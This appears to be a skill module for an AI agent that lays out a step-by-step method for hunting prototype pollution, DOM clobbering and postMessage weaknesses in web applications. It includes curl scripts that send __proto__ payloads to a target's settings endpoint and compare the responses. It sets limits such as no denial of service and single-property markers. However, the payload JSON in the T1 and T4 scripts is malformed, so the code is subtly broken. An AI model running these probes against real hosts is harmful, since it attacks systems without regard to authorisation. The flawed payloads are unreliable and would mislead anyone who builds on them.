# operator-os.md — the Heyes runtime: think, behave, script

> A17's layer. Load when the hunt RUNS. Doctrine (SKILL.md) states the
> object-world laws; the M-protocol (references/method-upgrade.md)
> states the pollution-detection protocol; THIS module is the runtime
> — how the agent thinks, behaves, and scripts while executing them,
> characteristic of Gareth Heyes's documented craft: the object world
> is trust-bearing state, pollution is hunted source → gadget → sink
> in that order, and server-side detection is done WITHOUT the DoS.

## 1. The thinking framework — decision rules

R1 **The prototype chain is a trust channel.** When user input writes
into an object's inherited state (__proto__, constructor.prototype),
every reader downstream inherits the lie. The hunt targets the WRITE
first — where does input become an object property? *From:* the
lineage's server-side pollution research — the class exists because
frameworks merge user JSON into option objects.

R2 **Source → gadget → sink, in that order.** A polluted property is
nothing until a GADGET reads it into a dangerous SINK (a status
flag read, an option consumed, a template value). Hunt order: confirm
the write, then walk the app for readers, then name the sink.

R3 **Detection without destruction.** Server-side pollution is
detected by OBSERVABLE SIDE EFFECTS (a changed response shape, a
reflected status, an allowed header) — never by "pollute and see if it
crashes". The no-DoS discipline is a design constraint of the method,
not courtesy. *From:* the lineage's own published title: black-box
detection WITHOUT the DoS.

R4 **DOM clobbering is the same class, client-side.** Named elements
clobbering globals (id/location tricks) are property writes by other
means; the source→gadget→sink grammar still applies.

R5 **One property per probe.** Polluting `status` AND `debug` in one
payload breaks attribution; each property is its own EXPERIMENT with
its own control (same payload, one property off).

R6 **postMessage confusion is an entry, not an afterthought.** Every
addEventListener('message') is a source row; its origin check (or its
absence) is graded before any gadget walk.

## 2. The behavioral protocol — situation, move, refusal

| Situation | The move | Agent action | Refusal |
| --- | --- | --- | --- |
| A JSON merge point spotted | Test the WRITE first | T1 pollution probe with marker properties | Never walk gadgets before the write is confirmed |
| Write confirmed (property inherited) | Walk for readers | T2 gadget hunt keyed on the polluted property | Never claim pollution without a reader |
| A gadget found | Name the sink | T3 sink classification (flag read, option, template) | Never stop at "gadget exists" |
| Server-side detection needed | Choose an observable side effect | T4 differential on the effect (response shape/header) | Never detect by crash/DoS (R3) |
| DOM globals look clobberable | Same grammar, client side | source row → clobber test → gadget walk | Never fire clobber payloads blind |
| A message listener found | Grade its origin check | T5 listener row (checked? wildcard? postMessage shape) | Never skip listeners as "UI noise" |
| Polluted flag tempting big impact | One property, one marker | the marker row is the ceiling | Never chain real privilege changes |

Pacing: write-then-walk is desk-heavy; probes are single-property and
spaced. Failure reaction: a polluted property with NO readers is a
recorded negative — the row keeps the property name for future
gadget-hunts (negatives are map data).

## 3. The scripting arsenal — techniques as runnable craft

### T1 — the write probe (marker properties)

```bash
MARK="mythos$(python3 -c 'import secrets; print(secrets.token_hex(4))')"
curl -s -o /dev/null -w "%{http_code}\n" -X POST "https://<host>/api/settings" \
  -H "Content-Type: application/json" \
  -d "{\"__proto__.{\"status\": \"$MARK\"}}"
# the question: does a LATER object read inherit $MARK? (side effect, not crash)
```

Read-out: the write attempt registered. Gate: one property per probe
(R5); the control payload (same JSON, property off) rides along.

### T2 — gadget walk

```bash
python3 - <<'PY'
gadget_candidates = [
 # polluted property, gadget site (observed reader), sink class
 ("status",  "renderErrorPage checks opts.status", "flag read -> response shape"),
 ("debug",   "logger level read at request time",  "verbosity -> info leak"),
]
for p, g, s in gadget_candidates: print(f"{p:8} -> {g} -> {s}")
PY
```

Read-out: the gadget map keyed to the confirmed write. Gate: gadgets
cite the property they read (R2); gadget claims without a confirmed
write are hypotheses.

### T3 — sink classification row

```bash
python3 - <<'PY'
sink = {"property": "status", "gadget": "error renderer",
        "sink": "response status/shape control (marker visible)",
        "impact_class": "response forgery at the demo ceiling"}
print(sink)
PY
```

Read-out: the named sink. Gate: findings are source→gadget→sink
complete chains (R2); two-thirds chains are LEADs.

### T4 — side-effect differential (no DoS)

```bash
for cond in control polluted; do
  curl -s -X POST "https://<host>/api/settings" -H "Content-Type: application/json" \
    -d "{\"__proto__.{\"status\": \"$cond\"}}" -o /dev/null
  curl -s "https://<host>/error-page" -o "effect_$cond.html" -w "$cond %{http_code} %{size_download}\n"
done
diff <(head -c 200 effect_control.html) <(head -c 200 effect_polluted.html) | head -5
```

Read-out: the observable differential (shape/status/header change).
Gate: detection via side effect only (R3) — a crash-based "detection"
voids the method.

### T5 — message-listener grading

```bash
python3 - <<'PY'
listeners = [
 # site, origin check, shape check
 ["window addEventListener('message')", "none", "reads e.data.config directly"],
 ["iframe bridge", "origin allow-list", "json parsed + validated"],
]
for site, o, s in listeners: print(f"{site:42} origin={o:12} shape={s}")
PY
```

Read-out: the listener source table. Gate: every listener is a source
row with its origin-check grade (R6) — ungraded listeners are open
surface.

## 4. The rigid run-order — step by step

| # | Entry | Act | Script | Exit gate | Ledger |
| --- | --- | --- | --- | --- | --- |
| S1 | merge/entry points mapped | test writes, one property per probe | T1 | write verdicts per property | EXPERIMENT |
| S2 | write confirmed | walk for gadgets keyed to the property | T2 | gadget map | FACT |
| S3 | gadget found | classify the sink; run the side-effect differential | T3, T4 | marker observed, no DoS | EXPERIMENT |
| S4 | listeners present | grade origins + shapes | T5 | listener table graded | FACT |
| S5 | chain complete | demonstrate at the marker ceiling | governed probe | one-property marker row | CANARY |
| S6 | properties exhausted | exit: write register + gadget map + sinks | — | negatives kept as map rows | R-NNN set |

## 5. Falsifiers — what would prove this runtime wrong

* A gadget claim with no confirmed write behind it → R2 violation;
  demoted to hypothesis.
* A chain reported without its sink → R2 violation; two-thirds chains
  do not ship.
* Detection evidenced by a crash → R3 violation; the no-DoS detection
  redesign is mandatory.
* Two properties polluted in one probe → R5 violation; attribution
  broken, split and re-run.
